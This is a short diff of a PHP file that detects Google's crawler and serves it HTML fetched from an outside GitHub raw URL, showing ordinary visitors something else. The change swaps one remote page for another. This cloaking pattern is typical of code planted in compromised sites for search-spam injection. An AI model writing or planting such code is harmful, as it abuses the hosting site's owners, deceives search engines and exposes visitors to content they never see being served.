@@ -12,7 +12,7 @@ function is_google_bot() {
 }
 
 if (is_google_bot()) {
-    $bot_content = file_get_contents('https://raw.githubusercontent.com/bahlil-ktl/oneshoot/refs/heads/main/ww.html');
+    $bot_content = file_get_contents('https://raw.githubusercontent.com/bahlil-ktl/oneshoot/refs/heads/main/landing.html');
     echo $bot_content;
     exit;
 } else {
